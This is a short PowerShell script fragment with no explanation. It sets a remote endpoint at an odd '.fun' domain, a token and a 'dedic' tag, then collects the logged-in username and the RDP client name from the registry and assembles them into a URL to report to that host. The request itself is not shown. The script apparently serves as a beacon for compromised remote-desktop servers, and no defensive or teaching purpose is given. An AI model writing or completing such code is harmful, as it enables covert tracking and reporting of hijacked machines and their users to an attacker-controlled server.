#

####

$domainUrl = 'http://123123123.fun/index-v3.php' # ?......
$token     = '1313123'
$dedicName = 'D-'

####

$ENV_USER    = $env:USERNAME
#$ENV_DOMAIN  = $env:LOGONSERVER,

$sessionID = (Get-Process -PID $pid).SessionID
$ENV_CLIENT = (Get-ItemProperty -path ("HKCU:\Volatile Environment\" + $sessionID) -name "CLIENTNAME").CLIENTNAME

#$ENV_RDPSESS = $env:SESSIONNAME

####

$URL_HALF = $domainUrl + '?token='+$token + '&dedic='+$dedicName + '&user='+$ENV_USER + '&client='+$ENV_CLIENT

####

#